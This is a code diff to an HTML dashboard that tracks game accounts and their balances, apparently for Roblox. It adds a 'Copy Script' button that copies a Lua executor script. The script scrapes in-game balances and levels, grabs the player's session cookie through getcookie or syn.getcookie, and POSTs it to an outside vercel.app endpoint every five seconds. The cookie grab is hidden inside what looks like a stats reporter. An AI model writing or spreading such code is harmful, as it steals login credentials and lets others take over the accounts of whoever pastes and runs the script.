@@ -81,6 +81,8 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
   <div class="meta"><span><b id="mAcc">0</b> accounts</span><span><b id="mLive">0</b> live</span><span>session <b id="mSes">0h</b></span></div>
   <div class="sp"></div>
   <button class="b live on" id="live"><span class="dot"></span>Live</button>
+  <!-- 🔴 الزر الجديد -->
+  <button class="b" id="copy-script">Copy Script</button>
   <button class="b" id="exp">Export CSV</button>
 </div>
 
@@ -207,8 +209,25 @@ $("bcopy").onclick=function(){try{navigator.clipboard.writeText(accs.filter(func
 
 $("exp").onclick=function(){var t="\uFEFFstatus,machine,username,pocket,bank,total\n"+accs.map(function(a){return[a.st,a.pc,a.user,a.pocket,a.bank,tot(a)].join(",")}).join("\n");try{var l=document.createElement("a");l.href=URL.createObjectURL(new Blob([t],{type:"text/csv"}));l.download="accounts.csv";l.click()}catch(e){}};
 
-// 🔴 شلنا الحركة الوهمية عشان البيانات تظل حقيقية 100%
-// setInterval(function(){...}, 2200);
+// 🔴 زر نسخ السكربت الجديد
+$("copy-script").onclick = async function() {
+    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${SERVER_DATA.my_key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="https://flame-ten-18.vercel.app/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
+    try {
+        await navigator.clipboard.writeText(script);
+        const btn = $("copy-script");
+        const old = btn.innerHTML;
+        btn.innerHTML = "✅ Copied!";
+        btn.style.color = "var(--ok)";
+        btn.style.borderColor = "var(--ok)";
+        setTimeout(() => {
+            btn.innerHTML = old;
+            btn.style.color = "";
+            btn.style.borderColor = "";
+        }, 2000);
+    } catch(e) {
+        alert("Failed to copy.");
+    }
+};
 
 draw();
 </script>
